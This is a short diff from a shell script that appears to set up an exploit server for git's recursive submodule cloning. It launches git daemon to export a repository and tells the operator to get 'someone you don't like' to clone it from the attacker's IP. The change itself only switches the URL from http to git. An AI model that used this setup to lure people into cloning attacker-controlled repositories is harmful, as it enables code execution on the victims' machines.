@@ -31,7 +31,7 @@ cd /tmp
 
 echo "[*] Executing gitdaemon"
 echo "[*] Please ensure no firewall rules block git daemon"
-echo "[*] All done, now tell someone you don't like to \`git clone --recurse-submodules http://<your ip>/repo dest_dir\`"
+echo "[*] All done, now tell someone you don't like to \`git clone --recurse-submodules git://<your ip>/repo dest_dir\`"
 
 
 git daemon --base-path=. --export-all --reuseaddr --informative-errors --verbose
